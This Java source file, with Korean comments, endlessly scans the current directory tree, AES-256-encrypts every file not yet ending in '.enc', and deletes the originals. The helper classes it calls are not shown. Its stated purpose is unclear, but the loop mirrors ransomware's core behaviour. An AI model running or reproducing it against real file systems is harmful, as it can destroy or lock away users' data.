package safo;

import java.util.*;
import java.io.*;

import safo.Cryptor;
import safo.Monitor;
import safo.DeleteFile;

/*
 * 아파치  오픈소스 jar인 commons-codec-1.13.jar(AES256암호화할시 사용)과 
 * commons-io-2.6.jar(현재 디렉토리부터 하위 디렉토리까지의 파일 목록을 만들어 줌)을 사용한다.
 * MainAES클래스에서는 Monitor클래스의 Scanning 메소드를 이용하여 현재 디렉토리부터 하위 디렉토리까지
 * 파일을 Arraylist<String> 형식으로 만들어서 return해주면 그 정보를 바탕으로 암호화를 시켜주고 
 * 원본 파일을 삭제를 한다. 그리고 위의 과정을 계속 반복한다. 이때 암호화된 파일은 다시 암호화 시키지는 않는다.
 */

public class MainAES {

	public static void main(String[] args) throws Exception {
/*
 * 개선점 : 새로운 파일 생성 시 암호화 시켜주기 위해서 무한루프를 돌리는 것은 매우 비효율적인 것 같다. 그래서 cpu와 메모리를
 * 덜 사용하는 방안을 찾아야 된다.
 */
		while (true) {
			for (String list : Monitor.Scanning()) {
				if (!(list.contains(".enc"))) {
					Cryptor.EncodingFile(list);
					Runnable r1 = new DeleteFile(list);
					Thread t1 = new Thread(r1);
					t1.start();
				}
			}
		}

	}

}